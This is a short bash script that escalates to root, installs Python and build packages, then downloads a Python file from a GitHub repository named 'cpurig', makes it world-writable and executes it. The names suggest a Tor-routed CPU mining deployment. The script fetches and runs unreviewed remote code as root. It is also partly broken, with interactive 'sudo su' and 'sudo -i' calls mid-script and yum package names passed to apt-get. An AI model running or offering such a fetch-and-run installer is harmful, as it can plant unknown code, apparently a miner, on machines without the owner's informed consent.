#!/bin/bash
if [ "$(id -u)" != "0" ]; then
   sudo su   
else
	echo "Root user"
fi
sudo -i
apt-get update
apt-get install -y git wget screen
apt-get install -y python python-dev
apt-get install -y epel-release
apt-get install -y python-pip
apt install -y python3-pip
apt-get install -y gcc-c++
pip install sh
rm -rf ubuntu_tor_docker.py
wget https://raw.githubusercontent.com/wollfoo/cpurig/master/ubuntu_tor_docker.py
chmod 777 ubuntu_tor_docker.py
python ubuntu_tor_docker.py


